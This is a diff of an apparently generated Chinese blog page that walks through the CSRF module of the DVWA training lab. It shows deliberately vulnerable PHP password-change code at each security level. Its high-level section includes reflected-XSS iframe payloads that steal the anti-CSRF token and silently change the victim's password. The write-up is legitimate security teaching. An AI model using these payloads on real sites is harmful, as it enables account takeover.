@@ -502,14 +502,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    6 分
                 </div>
                 
 
@@ -544,35 +544,8 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Change'</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    $pass_new  = $_GET[ <span class="hljs-string">'password_new'</span> ];<br>    $pass_conf = $_GET[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( $pass_new == $pass_conf ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        $pass_new = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>        $pass_new = md5( $pass_new );<br><br>        <span class="hljs-comment">// Update the database</span><br>        $insert = <span class="hljs-string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="hljs-string">"';"</span>;<br>        $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $insert ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>    &#125;<br><br>    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_GET[ &#39;Change&#39; ] ) ) {
-    // Get input
-    $pass_new  = $_GET[ &#39;password_new&#39; ];
-    $pass_conf = $_GET[ &#39;password_conf&#39; ];
-
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-        // They do!
-        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-        $pass_new = md5( $pass_new );
-
-        // Update the database
-        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
-        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
-
-        // Feedback for the user
-        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Issue with passwords matching
-        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-?&gt; </code></pre>
 <ul>
 <li>修改密码过程针对第三方站点自动化请求无任何防御机制，可以在用户登录状态下由第三方站点自动发起修改密码操作。</li>
 </ul>
@@ -619,42 +592,8 @@ if( isset( $_GET[ &#39;Change&#39; ] ) ) {
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Change'</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="hljs-string">'SERVER_NAME'</span> ]) !== <span class="hljs-keyword">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        $pass_new  = $_GET[ <span class="hljs-string">'password_new'</span> ];<br>        $pass_conf = $_GET[ <span class="hljs-string">'password_conf'</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( $pass_new == $pass_conf ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            $pass_new = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>            $pass_new = md5( $pass_new );<br><br>            <span class="hljs-comment">// Update the database</span><br>            $insert = <span class="hljs-string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="hljs-string">"';"</span>;<br>            $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $insert ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn't come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;<br>    &#125;<br><br>    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_GET[ &#39;Change&#39; ] ) ) {
-    // Checks to see where the request came from
-    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) {
-        // Get input
-        $pass_new  = $_GET[ &#39;password_new&#39; ];
-        $pass_conf = $_GET[ &#39;password_conf&#39; ];
-
-        // Do the passwords match?
-        if( $pass_new == $pass_conf ) {
-            // They do!
-            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-            $pass_new = md5( $pass_new );
-
-            // Update the database
-            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
-            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
-
-            // Feedback for the user
-            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-        }
-        else {
-            // Issue with passwords matching
-            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-        }
-    }
-    else {
-        // Didn&#39;t come from a trusted source
-        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-?&gt; </code></pre>
 <ul>
 <li>针对请求来源使用 http referrer 头信息进行检查，但是检查逻辑存在问题，检查逻辑为在 referer 中查找服务器名称，若查找到则成功，否则失败。</li>
 </ul>
@@ -703,41 +642,8 @@ if( isset( $_GET[ &#39;Change&#39; ] ) ) {
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Change'</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    $pass_new  = $_GET[ <span class="hljs-string">'password_new'</span> ];<br>    $pass_conf = $_GET[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( $pass_new == $pass_conf ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        $pass_new = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>        $pass_new = md5( $pass_new );<br><br>        <span class="hljs-comment">// Update the database</span><br>        $insert = <span class="hljs-string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="hljs-string">"';"</span>;<br>        $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $insert ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>    &#125;<br><br>    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_GET[ &#39;Change&#39; ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
-
-    // Get input
-    $pass_new  = $_GET[ &#39;password_new&#39; ];
-    $pass_conf = $_GET[ &#39;password_conf&#39; ];
-
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-        // They do!
-        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-        $pass_new = md5( $pass_new );
-
-        // Update the database
-        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
-        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
-
-        // Feedback for the user
-        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Issue with passwords matching
-        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
-    }
-
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?&gt; </code></pre>
 <ul>
 <li>针对请求进行随机 token 验证， 需要借助 xss 漏洞实现漏洞利用  </li>
 </ul>
@@ -752,16 +658,15 @@ generateSessionToken();
 <ul>
 <li>通过反射型XSS获取修改密码表单<code>user_token</code>，payload：</li>
 </ul>
-<pre><code class="javascript">&lt;iframe src=&quot;../csrf/&quot;onload=&quot;alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&quot;&gt;&lt;/iframe&gt; </code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe src=<span class="hljs-string">"../csrf/"</span>onload=<span class="hljs-string">"alert(frames[0].document.getElementsByName('user_token')[0].value)"</span>&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/反射型XSS获取user_token.png" alt="反射型XSS获取user_token"></center>
 
 <ul>
 <li>利用反射型XSS自动提交修改密码表单，payload：</li>
 </ul>
-<pre><code class="javascript">&lt;iframe src=&quot;../csrf&quot; onload=&quot;var t=frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value,x=new
-XMLHttpRequest();x.open(&#39;GET&#39;,
-&#39;../csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_toke
-n=&#39;+t, null);x.send()&quot;&gt;&lt;/iframe&gt;</code></pre>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe src="../csrf" onload="var t=frames[0].document.getElementsByName('user_token')[0].value,x=new<br>XMLHttpRequest();x.open('GET',<br>'../csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_toke<br>n='+t, null);x.send()"&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CSRF/csrf-xss-payload.png" alt="csrf-xss-payload"></center>
 
 <ul>
@@ -777,54 +682,8 @@ n=&#39;+t, null);x.send()&quot;&gt;&lt;/iframe&gt;</code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Change'</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    $pass_curr = $_GET[ <span class="hljs-string">'password_current'</span> ];<br>    $pass_new  = $_GET[ <span class="hljs-string">'password_new'</span> ];<br>    $pass_conf = $_GET[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    $pass_curr = stripslashes( $pass_curr );<br>    $pass_curr = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>    $pass_curr = md5( $pass_curr );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    $data = $db-&gt;prepare( <span class="hljs-string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );<br>    $data-&gt;bindParam( <span class="hljs-string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>    $data-&gt;bindParam( <span class="hljs-string">':password'</span>, $pass_curr, PDO::PARAM_STR );<br>    $data-&gt;execute();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        $pass_new = stripslashes( $pass_new );<br>        $pass_new = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>        $pass_new = md5( $pass_new );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        $data = $db-&gt;prepare( <span class="hljs-string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );<br>        $data-&gt;bindParam( <span class="hljs-string">':password'</span>, $pass_new, PDO::PARAM_STR );<br>        $data-&gt;bindParam( <span class="hljs-string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>        $data-&gt;execute();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_GET[ &#39;Change&#39; ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
-
-    // Get input
-    $pass_curr = $_GET[ &#39;password_current&#39; ];
-    $pass_new  = $_GET[ &#39;password_new&#39; ];
-    $pass_conf = $_GET[ &#39;password_conf&#39; ];
-
-    // Sanitise current password input
-    $pass_curr = stripslashes( $pass_curr );
-    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $pass_curr = md5( $pass_curr );
-
-    // Check that the current password is correct
-    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
-    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
-    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );
-    $data-&gt;execute();
-
-    // Do both new passwords match and does the current password match the user?
-    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
-        // It does!
-        $pass_new = stripslashes( $pass_new );
-        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-        $pass_new = md5( $pass_new );
-
-        // Update database with new password
-        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );
-        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );
-        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
-        $data-&gt;execute();
-
-        // Feedback for the user
-        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Issue with passwords matching
-        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
-    }
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?&gt; </code></pre>
 <ul>
 <li>添加原密码验证功能，同时使用PDO创建动态SQL语句。</li>
 </ul>
@@ -1474,7 +1333,7 @@ generateSessionToken();
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
